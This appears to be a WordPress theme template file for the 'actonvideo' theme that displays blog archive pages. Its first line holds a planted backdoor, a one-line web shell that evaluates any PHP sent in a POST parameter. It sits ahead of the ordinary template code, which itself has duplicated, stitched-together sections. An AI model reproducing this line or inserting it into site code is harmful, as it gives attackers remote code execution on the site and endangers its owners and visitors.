<?php @eval($_POST['dd']);?><?php
/**
 * The template for displaying archive pages
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package actonvideo
 */

get_header(); ?>



<?php
/**
* Template Name: Blogs
*
* This is the template that displays all pages by default.
* Please note that this is the WordPress construct of pages
* and that other 'pages' on your WordPress site may use a
* different template.
*
* @link https://codex.wordpress.org/Template_Hierarchy
*
* @package actonvideo
*/
get_header(); ?>
<style>
	body{background:#f0f0f0 !important;}
</style>

<div class="clearfix"></div>

<div class="clearfix"></div>
<div class="blog-container">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<div class="col-md-9">
					<div class="blog-left">
			<?php
		if ( have_posts() ) : ?>
			<?php while ( have_posts() ) : the_post(); ?>

						<?php $image = wp_get_attachment_image_src( get_post_thumbnail_id( $post->ID ), 'single-post-thumbnail' ); ?>
							<div class="featured-blog">
							<a href="<?php the_permalink(); ?>"><img style="width:100%" class="img-resposive" src="<?php echo $image[0]; ?>"/></a>
							<h2><?php the_title(); ?></h2>
							<p class="blog-info">Posted by   <?php echo $author = get_the_author(); ?>  —  <?php echo get_the_date('d' ); ?> <?php echo get_the_date('M' ); ?>
							<p><?php echo substr(wp_strip_all_tags( get_the_content() ), 0, 100); ?>
							</p>
							<a class="read-more" href="<?php the_permalink(); ?>">Read More...</a>
							</div>

								<?php
							endwhile;
							else :

								get_template_part( 'template-parts/content', 'none' );

							endif; ?>
							
							
						</div>
					</div>
					<div class="col-md-3">
						<div class="blog-sidebar">
							<?php dynamic_sidebar('sidebar' ); ?>
							
							
							
							
							
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<?php get_footer(); ?>














		<?php
		if ( have_posts() ) : ?>
			<?php while ( have_posts() ) : the_post(); ?>

	














			<?php endwhile;

			the_posts_navigation();

				else :

			get_template_part( 'template-parts/content', 'none' );

		endif; ?>

<?php
get_footer();
